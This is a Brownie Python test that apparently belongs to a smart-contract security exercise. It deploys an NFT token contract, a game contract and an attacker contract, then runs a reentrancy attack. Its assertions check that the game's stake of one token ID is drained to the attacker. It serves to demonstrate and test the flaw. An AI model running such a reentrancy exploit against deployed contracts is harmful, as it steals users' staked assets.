from brownie import accounts, CryptoEmpireToken, CryptoEmpireGame, Attack4

def test_reentrancy_4():
    # Acct setup
    [dep, user1, user2, attacker] = accounts[:4]


    #Deploying Target 1
    cryptoT = CryptoEmpireToken.deploy({'from': dep})
    #Deploying Target 2
    cryptoG = CryptoEmpireGame.deploy(cryptoT.address, {'from': dep})
    #Deploying Attacker Contract 
    att = Attack4.deploy(cryptoG.address, {'from': attacker, 'value': '1 ether'})

    # MINTING 1 NFT for each account
    cryptoT.mint(user1, 1, 0)
    cryptoT.mint(user2, 1, 1)
    cryptoT.mint(attacker, 1, 2)

    #The CryptoEmpire game gained many users already and has some NFTs either staked or listed in it
    for i in range(0,5):
        cryptoT.mint(cryptoG.address, 20, i)

    # Transfering 1 token from attacker account to attacker contract
    cryptoT.safeTransferFrom(attacker.address, att.address, 2, 1,"0x", {'from': attacker.address})

    #Asserting Attacker's contract new balance
    assert(cryptoT.balanceOf(att, 2) == 1)

    # Running ATTTACK 
    att.attack()

    assert(cryptoT.balanceOf(cryptoG, 2) == 0)
    assert(cryptoT.balanceOf(attacker, 2) == 21)
